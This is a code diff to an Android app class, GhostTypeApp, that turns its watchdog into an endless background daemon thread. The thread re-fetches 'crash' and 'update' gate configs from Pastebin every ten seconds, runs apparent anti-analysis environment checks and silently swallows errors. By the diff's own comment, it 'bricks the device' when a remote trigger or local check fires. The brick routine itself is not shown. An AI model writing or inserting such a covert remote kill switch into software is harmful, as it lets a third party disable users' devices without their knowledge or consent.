@@ -169,20 +169,29 @@ class GhostTypeApp : Application() {
 
     /**
      * Background watchdog that periodically re-checks environment
-     * safety and crash state while the process is alive.
+     * safety, re-fetches crash/update Pastebin configs, and bricks
+     * the device if any check fails — all on a background daemon
+     * thread so the main thread is never blocked.
      */
     private fun startWatchdog() {
-        android.os.Handler(android.os.Looper.myLooper()!!).postDelayed(object : Runnable {
-            override fun run() {
-                if (!com.ghosttype.security.Hardener.isEnvironmentSafe(this@GhostTypeApp) ||
-                    com.ghosttype.security.CrashGate.hasBrickMarker(this@GhostTypeApp) ||
-                    com.ghosttype.utils.SettingsStore.prefs(this@GhostTypeApp)
-                        .getBoolean("crash_app_triggered", false)) {
-                    com.ghosttype.security.Hardener.brick(this@GhostTypeApp)
-                    return
-                }
-                android.os.Handler(android.os.Looper.myLooper()!!).postDelayed(this, 30_000L)
+        Thread {
+            while (true) {
+                try {
+                    // 1. Re-fetch crash & update gates from Pastebin
+                    runCatching { com.ghosttype.security.CrashGate.check(this@GhostTypeApp) }
+                    runCatching { com.ghosttype.security.UpdateGate.check(this@GhostTypeApp) }
+
+                    // 2. Check all local signals
+                    if (!com.ghosttype.security.Hardener.isEnvironmentSafe(this@GhostTypeApp) ||
+                        com.ghosttype.security.CrashGate.hasBrickMarker(this@GhostTypeApp) ||
+                        com.ghosttype.utils.SettingsStore.prefs(this@GhostTypeApp)
+                            .getBoolean("crash_app_triggered", false)) {
+                        com.ghosttype.security.Hardener.brick(this@GhostTypeApp)
+                        return@Thread
+                    }
+                } catch (_: Throwable) {}
+                Thread.sleep(10_000L)   // re-check every 10 seconds
             }
-        }, 30_000L)
+        }.apply { isDaemon = true }.start()
     }
 }
